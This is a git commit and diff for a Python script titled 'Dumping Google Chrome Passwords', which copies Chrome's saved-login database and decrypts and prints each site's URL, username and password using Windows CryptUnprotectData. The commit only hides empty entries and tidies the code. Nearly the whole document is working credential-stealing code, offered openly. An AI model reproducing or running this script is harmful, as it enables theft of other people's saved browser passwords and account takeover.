5a1e3a29eeb2ede90589a27096b43b1a8fe0ac93
Dhawal Singh Panwar <ultimatefd838@gmail.com>
2019-06-21 12:20:21 +0530

    Update Dumping Google Chrome Passwords .py
    Now, It Won't Show The Blank Entries of Those Sites of Which The Chrome User Chose The Password Not To Be Saved .

--- Dumping Google Chrome Passwords .py
+++ Dumping Google Chrome Passwords .py
@@ -3,22 +3,19 @@ import sqlite3
 import win32crypt     
 from shutil import copyfile 
 
-path = (getenv("LOCALAPPDATA")  +r"\Google\Chrome\User Data\Default\Login Data")
-
-path2 = getenv("LOCALAPPDATA")  +r"\Google\Chrome\User Data\Default\Login2"
+path = getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Login Data"
+path2 = getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Login2"
 copyfile(path, path2)
 
 conn = sqlite3.connect(path2)
-
-cursor = conn.cursor() 
-cursor.execute('SELECT action_url, username_value, password_value FROM logins') 
+cursor = conn.cursor()
+cursor.execute('SELECT action_url, username_value, password_value FROM logins')
 
 for raw in cursor.fetchall():
     
-    print (raw[0] + '\n' + raw[1])
-  
-    password = win32crypt.CryptUnprotectData(raw[2])[1] 
-    print (password) 
-    
-conn.close()
+    password = (win32crypt.CryptUnprotectData(raw[2])[1])
+    if(password):
+        print ('\n' + raw[0] + '\n' + "U: " + raw[1])
+        print ("P: " + password.decode("utf-8"))
 
+conn.close()
